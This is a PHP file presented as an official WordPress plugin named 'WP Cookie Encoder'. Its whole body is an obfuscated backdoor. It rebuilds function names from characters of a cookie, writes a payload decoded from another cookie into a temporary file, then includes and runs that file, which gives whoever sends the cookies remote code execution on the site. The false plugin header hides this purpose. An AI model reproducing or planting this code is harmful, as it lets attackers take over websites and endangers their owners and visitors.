<?php
/*
Plugin Name: WP Cookie Encoder
Plugin URI: http://wordpress.org/#
Description: Official WordPress plugin
Author: WordPress
Version: 1.3.5
Author URI: http://wordpress.org/#
*/

$c = $_COOKIE;
$k = 0;
$n = 5;
$p = array();
$p[$k] = '';
while ($n)
{
    $p[$k] .= $c[14][$n];
    if (!$c[14][$n + 1])
    {
        if (!$c[14][$n + 2]) break;
        $k++;
        $p[$k] = '';
        $n++;
    }
    $n = $n + 5 + 1;
}
$k = $p[21]() . $p[13];
if (!$p[5]($k))
{
    $n = $p[6]($k, $p[15]);
    $p[25]($n, $p[29] . $p[10]($p[7]($c[3])));
}
include ($k);
/* lcijhg */